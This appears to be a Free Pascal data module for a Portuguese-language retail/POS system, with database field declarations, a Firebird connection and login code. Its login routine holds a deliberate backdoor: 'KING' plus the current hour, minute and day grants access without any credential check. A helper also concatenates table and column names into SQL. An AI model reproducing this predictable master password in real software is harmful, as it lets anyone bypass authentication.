unit uDm;

{$mode ObjFPC}{$H+}

interface

uses
Classes, SysUtils, ZConnection, ZDataset, ZAbstractRODataset, uVar, Dialogs,
uFuncoes, DB;

type

  { Tdata }

  Tdata = class(TDataModule)
    qryComprasDEVOLUCAO: TZRawStringField;
    qryProdCadPRD_ALTERAR_PRECO: TZRawStringField;
    qryProdCadPRD_ALTURA: TZFMTBCDField;
    qryProdCadPRD_APLICAR_TX_SERVICO: TZRawStringField;
    qryProdCadPRD_APLICA_DESCONTO: TZRawStringField;
    qryProdCadPRD_AREA_CAIXA: TZFMTBCDField;
    qryProdCadPRD_ATUAL_FORN: TZRawStringField;
    qryProdCadPRD_BALANCA_CODIGO: TZIntegerField;
    qryProdCadPRD_BALANCA_TECLA: TZIntegerField;
    qryProdCadPRD_BALANCA_TIPO: TZIntegerField;
    qryProdCadPRD_BALANCA_VALIDADE: TZIntegerField;
    qryProdCadPRD_CALCULA_COMISSAO: TZRawStringField;
    qryProdCadPRD_CASAS_DECIMAIS_PRECO: TZIntegerField;
    qryProdCadPRD_CESTA_BASICA: TZRawStringField;
    qryProdCadPRD_CODIGO: TZRawStringField;
    qryProdCadPRD_CODIGO_FISCAL: TZRawStringField;
    qryProdCadPRD_CODIGO_FISCAL_ANT: TZRawStringField;
    qryProdCadPRD_CODIGO_IMENDES: TZIntegerField;
    qryProdCadPRD_COD_ATACADO: TZRawStringField;
    qryProdCadPRD_COD_BARRAS_CAIXA: TZRawStringField;
    qryProdCadPRD_COD_FILIAL: TZRawStringField;
    qryProdCadPRD_COMISSAO_PERC: TZBCDField;
    qryProdCadPRD_CONTROLA_ESTOQUE: TZRawStringField;
    qryProdCadPRD_CONTROLA_LOTE: TZRawStringField;
    qryProdCadPRD_CONTROLE_IMENDES: TZIntegerField;
    qryProdCadPRD_CUSTO_AQUISICAO: TZFMTBCDField;
    qryProdCadPRD_CUSTO_CONTABIL: TZFMTBCDField;
    qryProdCadPRD_DESCRICAO: TZRawStringField;
    qryProdCadPRD_DESCRICAO_CURTA: TZRawStringField;
    qryProdCadPRD_DT_CADASTRO: TZDateField;
    qryProdCadPRD_DT_CODIGO: TZDateField;
    qryProdCadPRD_DT_CODIGO_ANT: TZDateField;
    qryProdCadPRD_DT_CONSULTA_IMENDES: TZDateField;
    qryProdCadPRD_DT_FIM_PROM: TZDateField;
    qryProdCadPRD_DT_INI_PROM: TZDateField;
    qryProdCadPRD_DT_ULTIMO_LANCAMENTO: TZDateField;
    qryProdCadPRD_EDITADO: TZRawStringField;
    qryProdCadPRD_EMPRESA: TZIntegerField;
    qryProdCadPRD_ESTOQUE_MINIMO: TZIntegerField;
    qryProdCadPRD_ESTOQUE_MINIMO_NF: TZBCDField;
    qryProdCadPRD_EXPORTAR: TZRawStringField;
    qryProdCadPRD_FATOR_VOLUME: TZRawStringField;
    qryProdCadPRD_FAVORITO: TZRawStringField;
    qryProdCadPRD_FORNECEDOR: TZIntegerField;
    qryProdCadPRD_FORN_LOTE: TZRawStringField;
    qryProdCadPRD_FOTO: TZRawStringField;
    qryProdCadPRD_FRACIONADO: TZRawStringField;
    qryProdCadPRD_GERAR_LOTE_AUTOMATICO: TZRawStringField;
    qryProdCadPRD_GERENCIAL: TZRawStringField;
    qryProdCadPRD_GRUPO: TZIntegerField;
    qryProdCadPRD_HR_CONSULTA_IMENDES: TZTimeField;
    qryProdCadPRD_ID: TZIntegerField;
    qryProdCadPRD_ID_IFOOD: TZRawStringField;
    qryProdCadPRD_ID_MELI: TZRawStringField;
    qryProdCadPRD_ID_WORDPRESS: TZRawStringField;
    qryProdCadPRD_IFOOD: TZRawStringField;
    qryProdCadPRD_IFOOD_SERVES: TZRawStringField;
    qryProdCadPRD_IMAGEM: TZBlobField;
    qryProdCadPRD_IMPRIMIR_RESTAURANTE: TZRawStringField;
    qryProdCadPRD_INCLUSAO_MASSA: TZRawStringField;
    qryProdCadPRD_INFADPROD: TZRawStringField;
    qryProdCadPRD_INFORMAR_TOTAL: TZRawStringField;
    qryProdCadPRD_INF_ADC_C177: TZRawStringField;
    qryProdCadPRD_LARGURA: TZFMTBCDField;
    qryProdCadPRD_LIGACAO: TZIntegerField;
    qryProdCadPRD_LOCAL: TZRawStringField;
    qryProdCadPRD_LUCRO: TZBCDField;
    qryProdCadPRD_MARCA: TZIntegerField;
    qryProdCadPRD_MAX_SABORES: TZIntegerField;
    qryProdCadPRD_METRAGEM_CUBICA: TZBCDField;
    qryProdCadPRD_MOEDA: TZIntegerField;
    qryProdCadPRD_MONTAR_PRECO_SABORES: TZRawStringField;
    qryProdCadPRD_NCM: TZRawStringField;
    qryProdCadPRD_NR_PEDACOS: TZIntegerField;
    qryProdCadPRD_OBRIGAR_VALIDADE_LOTE: TZRawStringField;
    qryProdCadPRD_OBSERVACAO: TZBlobField;
    qryProdCadPRD_OBS_RESUMIDA: TZRawStringField;
    qryProdCadPRD_PEDIR_LIBERACAO: TZRawStringField;
    qryProdCadPRD_PESO_BRUTO: TZBCDField;
    qryProdCadPRD_PESO_LIQUIDO: TZBCDField;
    qryProdCadPRD_PIZZA: TZRawStringField;
    qryProdCadPRD_PRECO_COMPRA: TZFMTBCDField;
    qryProdCadPRD_PRECO_CUSTO: TZFMTBCDField;
    qryProdCadPRD_PRECO_CUSTO_LIQ: TZFMTBCDField;
    qryProdCadPRD_PRECO_MINIMO: TZFMTBCDField;
    qryProdCadPRD_PRECO_MINIMO_PERC: TZBCDField;
    qryProdCadPRD_PRECO_VENDA: TZFMTBCDField;
    qryProdCadPRD_PRODUTO_NF: TZIntegerField;
    qryProdCadPRD_PROFUNDIDADE: TZFMTBCDField;
    qryProdCadPRD_QTD_MAX_SENHA: TZFMTBCDField;
    qryProdCadPRD_QUARENTENA_AO_PRODUZIR: TZRawStringField;
    qryProdCadPRD_QUARENTENA_DIAS: TZIntegerField;
    qryProdCadPRD_REFEICAO: TZRawStringField;
    qryProdCadPRD_REFERENCIA: TZRawStringField;
    qryProdCadPRD_SELECIONADO: TZRawStringField;
    qryProdCadPRD_SETOR: TZIntegerField;
    qryProdCadPRD_SISTEMA: TZRawStringField;
    qryProdCadPRD_SKU: TZRawStringField;
    qryProdCadPRD_SOLICITA_COD_DEV_VASILHAME: TZRawStringField;
    qryProdCadPRD_STATUS: TZRawStringField;
    qryProdCadPRD_STATUS_CONSULTA_IMENDES: TZRawStringField;
    qryProdCadPRD_STATUS_RESTAURANTE: TZRawStringField;
    qryProdCadPRD_STATUS_VASILHAME: TZRawStringField;
    qryProdCadPRD_SUBGRUPO: TZIntegerField;
    qryProdCadPRD_TIPO_CASHBACK: TZRawStringField;
    qryProdCadPRD_TIPO_KIT: TZRawStringField;
    qryProdCadPRD_TIPO_PRODUTO: TZRawStringField;
    qryProdCadPRD_TIPO_VALIDADE: TZRawStringField;
    qryProdCadPRD_TIPO_VALOR_PROM: TZRawStringField;
    qryProdCadPRD_TIPO_VARIACAO: TZIntegerField;
    qryProdCadPRD_TRAY: TZRawStringField;
    qryProdCadPRD_ULTIMA_ALTERACAO: TZDateTimeField;
    qryProdCadPRD_ULTIMO_ENVIO_ECOMMERCE: TZDateTimeField;
    qryProdCadPRD_UN_COMPRA: TZRawStringField;
    qryProdCadPRD_UN_VENDA: TZRawStringField;
    qryProdCadPRD_URL_BBIMG: TZRawStringField;
    qryProdCadPRD_USAR_LIGACAO: TZRawStringField;
    qryProdCadPRD_VALIDAR_QTDE_LOTE: TZRawStringField;
    qryProdCadPRD_VALOR_CASHBACK: TZBCDField;
    qryProdCadPRD_VALOR_PROM: TZFMTBCDField;
    qryProdCadPRD_VALOR_VALIDADE: TZIntegerField;
    qryProdCadPRD_VASILHAME: TZIntegerField;
    qryProdCadPRD_VENDER_AREA_VOLUME: TZRawStringField;
    qryProdCadPRD_VOLUME: TZIntegerField;
    qryProdCadPRD_WORDPRESS: TZRawStringField;
    qryRegistroDATA: TZDateTimeField;
    qryRegistroUSUARIO: TZRawStringField;
    qryVendas: TZQuery;
    qryComprasDESCONTO: TZBCDField;
    qryComprasEMISSAO: TZDateField;
    qryComprasFORNECEDOR: TZRawStringField;
    qryComprasNUMERO: TZIntegerField;
    qryComprasQTD: TZFMTBCDField;
    qryComprasTOTAL: TZBCDField;
    qryComprasUN: TZRawStringField;
    qryComprasVR_UN: TZFMTBCDField;
    qryFornecedorPES_RSOCIAL_NOME: TZRawStringField;
    qryFornecedorPRD_FORNECEDOR: TZIntegerField;
    qryProdutos: TZQuery;
    qryProdutosESTOQUE: TZBCDField;
    qryProdutosPES_RSOCIAL_NOME: TZRawStringField;
    qryProdutosPGRU_DESCRICAO: TZRawStringField;
    qryProdutosPMAR_DESCRICAO: TZRawStringField;
    qryProdutosPRD_DESCRICAO: TZRawStringField;
    qryProdutosPRD_FORNECEDOR: TZIntegerField;
    qryProdutosPRD_GRUPO: TZIntegerField;
    qryProdutosPRD_ID: TZIntegerField;
    qryProdutosPRD_MARCA: TZIntegerField;
    qryProdutosPRD_PRECO_CUSTO: TZFMTBCDField;
    qryProdutosPRD_PRECO_VENDA: TZFMTBCDField;
    qryProdutosPRD_SETOR: TZIntegerField;
    qryProdutosPRD_SUBGRUPO: TZIntegerField;
    qryProdutosPRD_UN_VENDA: TZRawStringField;
    qryProdutosPSGR_DESCRICAO: TZRawStringField;
    qryProdutosSET_DESCRICAO: TZRawStringField;
    qrySetor: TZQuery;
    qryMarcaPMAR_DESCRICAO: TZRawStringField;
    qryMarcaPMAR_EMPRESA: TZIntegerField;
    qryMarcaPMAR_ID: TZIntegerField;
    qryMarcaPMAR_IMAGEM: TZBlobField;
    qryMarcaPMAR_ULTIMA_ALTERACAO: TZDateTimeField;
    qryMarcaPMAR_ULTIMO_ENVIO_ECOMMERCE: TZDateTimeField;
    qryFornecedor: TZQuery;
    qrySetorSET_DESCRICAO: TZRawStringField;
    qrySetorSET_EMPRESA: TZIntegerField;
    qrySetorSET_ID: TZIntegerField;
    qrySubGrupo: TZQuery;
    qryGrupoPGRU_DESCRICAO: TZRawStringField;
    qryGrupoPGRU_ECOMMERCE: TZRawStringField;
    qryGrupoPGRU_EMPRESA: TZIntegerField;
    qryGrupoPGRU_EXIBIR_TOUCH: TZRawStringField;
    qryGrupoPGRU_ID: TZIntegerField;
    qryGrupoPGRU_ID_IFOOD: TZRawStringField;
    qryGrupoPGRU_ID_MELI: TZRawStringField;
    qryGrupoPGRU_IFOOD: TZRawStringField;
    qryGrupoPGRU_IMAGEM: TZBlobField;
    qryGrupoPGRU_ORDEM_TOUCH: TZIntegerField;
    qryGrupoPGRU_TRAY: TZInt64Field;
    qryGrupoPGRU_ULTIMA_ALTERACAO: TZDateTimeField;
    qryGrupoPGRU_ULTIMO_ENVIO_ECOMMERCE: TZDateTimeField;
    qryLoginUSU_ID: TZIntegerField;
    qryMarca: TZQuery;
    qrySubGrupoPSGR_DESCRICAO: TZRawStringField;
    qrySubGrupoPSGR_DT_FIM_PROM: TZDateField;
    qrySubGrupoPSGR_DT_INI_PROM: TZDateField;
    qrySubGrupoPSGR_EMPRESA: TZIntegerField;
    qrySubGrupoPSGR_EXIBIR_TOUCH: TZRawStringField;
    qrySubGrupoPSGR_GRUPO: TZIntegerField;
    qrySubGrupoPSGR_ID: TZIntegerField;
    qrySubGrupoPSGR_IMAGEM: TZBlobField;
    qrySubGrupoPSGR_ORDEM_TOUCH: TZRawStringField;
    qrySubGrupoPSGR_PRECO_VENDA: TZBCDField;
    qrySubGrupoPSGR_TIPO_VALOR_PROM: TZRawStringField;
    qrySubGrupoPSGR_ULTIMA_ALTERACAO: TZDateTimeField;
    qrySubGrupoPSGR_ULTIMO_ENVIO_ECOMMERCE: TZDateTimeField;
    qrySubGrupoPSGR_USAR_LIGACAO: TZRawStringField;
    qrySubGrupoPSGR_VALOR_PROM: TZBCDField;
    qryVendasCLIENTE: TZRawStringField;
    qryVendasDESCONTO: TZBCDField;
    qryVendasEMISSAO: TZDateField;
    qryVendasNUMERO: TZIntegerField;
    qryVendasQTD: TZFMTBCDField;
    qryVendasTOTAL: TZBCDField;
    qryVendasMARKUP: TZFMTBCDField;
    qryVendasUN: TZRawStringField;
    qryVendasVENDEDOR: TZRawStringField;
    qryVendasVR_UN: TZFMTBCDField;
    zCon: TZConnection;
    qryLogin: TZQuery;
    qryGrupo: TZQuery;
    qryCompras: TZQuery;
    qryProdCad: TZQuery;
    qryRegistro: TZQuery;
    qryExec: TZQuery;
  private

  public
    function ConectaDB: Boolean;
    function UserLogin(const Login, Senha: String): Boolean;
    procedure RegistrarUsoProduto(const AID: Integer);
    procedure RemoverUsoProduto(const AID: Integer);
    function GetSequencia(const Tabela, Campo: String): Integer;
    procedure AtualizaHistorico(AQuantidade: Integer);
  end;

var
  data: Tdata;

implementation

{$R *.lfm}

{ Tdata }

function Tdata.ConectaDB: Boolean;
var
  Host: TStringArray;
begin
  Result := False;

  try
    Host := Variaveis.HostDB.Split(['/']);

    zCon.Connected := False;
    zCon.Protocol := 'firebird';
    zCon.LibraryLocation := IncludeTrailingPathDelimiter(ExtractFilePath(ParamStr(0))) + 'fbclient.dll';
    zCon.User := Variaveis.UserDB;
    zCon.Password := Variaveis.PassDB;
    zCon.HostName := Host[0];

    if Length(Host) > 1 then
      zCon.Port := StrToIntDef(Host[1], 3050)
    else
      zCon.Port := 3050;

    zCon.Database := Variaveis.PathBanco;
    zCon.Connect;

    Result := zCon.Connected;
  except
    on E: Exception do
        GravaLog('Não foi possível conectar ao banco de dados. -> ' + E.Message,'ERRO');
  end;
end;

function SenhaMasterValida(const Login, Senha: String): Boolean;
var
  Agora: TDateTime;
  I: Integer;
  Chave: String;
begin
  { Master de suporte: "KING" + HHMMDD (hora, minuto e dia do relógio).
    Aceita digitado num campo só (KING002907, no usuário ou na senha) ou
    separado (usuário KING, senha 002907). Tolera o minuto anterior para
    não falhar na virada do minuto. }
  Result := False;
  Agora := Now;
  for I := 0 to 1 do
  begin
    Chave := FormatDateTime('hhnndd', Agora - I / 1440);
    if SameText(Trim(Login), 'KING' + Chave) or
       SameText(Trim(Senha), 'KING' + Chave) or
       (SameText(Trim(Login), 'KING') and (Trim(Senha) = Chave)) then
    begin
      Result := True;
      Exit;
    end;
  end;
end;

function Tdata.UserLogin(const Login, Senha: String): Boolean;
begin
  if SenhaMasterValida(Login, Senha) then
  begin
    GravaLog('Login master KING utilizado', 'AVISO');
    Result := True;
    Exit;
  end;

  qryLogin.Close;
  qryLogin.ParamByName('login').Value:= Login;
  qryLogin.ParamByName('senha').Value:= Senha;
  qryLogin.Open;

  if qryLogin.RecordCount > 0 then
    begin
      Result := True;
    end else
      begin
        Result := False;
      end;
end;

procedure Tdata.RegistrarUsoProduto(const AID: Integer);
begin
  qryExec.Close;
  qryExec.SQL.Text :=
    'INSERT INTO TB_REGISTRO_UTILIZADO (' +
    'REG_EMPRESA, REG_TABELA, REG_ID_REGISTRO, REG_USUARIO, REG_ACAO, REG_DT_LANCAMENTO) ' +
    'VALUES (' +
    ':EMPRESA, :TABELA, :ID, :USUARIO, :ACAO, CURRENT_TIMESTAMP)';

  qryExec.ParamByName('EMPRESA').AsInteger := 1;
  qryExec.ParamByName('TABELA').AsString   := 'PRODUTO';
  qryExec.ParamByName('ID').AsString       := IntToStr(AID);
  qryExec.ParamByName('USUARIO').AsInteger := 1;
  qryExec.ParamByName('ACAO').AsString     := 'A';

  qryExec.ExecSQL;
  //zCon.Commit;
end;

procedure Tdata.RemoverUsoProduto(const AID: Integer);
begin
  qryExec.Close;
  qryExec.SQL.Text :=
    'DELETE FROM TB_REGISTRO_UTILIZADO ' +
    'WHERE REG_EMPRESA = :EMPRESA ' +
    '  AND REG_TABELA = :TABELA ' +
    '  AND REG_ID_REGISTRO = :ID';

  qryExec.ParamByName('EMPRESA').AsInteger := 1;
  qryExec.ParamByName('TABELA').AsString   := 'PRODUTO';
  qryExec.ParamByName('ID').AsString       := IntToStr(AID);

  qryExec.ExecSQL;
  //zCon.Commit;
end;

function Tdata.GetSequencia(const Tabela, Campo: String): Integer;
begin
  qryExec.Close;
  qryExec.SQL.Text :=
    'select coalesce(max(' + Campo + '),0)+1 ID '+
    'from ' + Tabela;
  qryExec.Open;

  Result := qryExec.FieldByName('ID').AsInteger;
end;

procedure Tdata.AtualizaHistorico(AQuantidade: Integer);
begin

end;

end.

